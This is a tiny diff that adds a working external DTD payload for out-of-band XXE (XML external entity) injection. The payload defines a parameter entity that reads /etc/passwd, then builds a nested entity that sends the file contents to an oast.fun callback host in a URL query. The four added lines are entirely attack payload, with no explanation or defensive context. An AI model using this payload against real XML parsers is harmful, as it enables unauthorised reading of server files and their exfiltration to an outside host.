@@ -1,1 +1,4 @@
-
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://hklxmvxvpbywrcitapdck8197gksw5xbp.oast.fun/?d=%file;'>">
+%eval;
+%exfil;
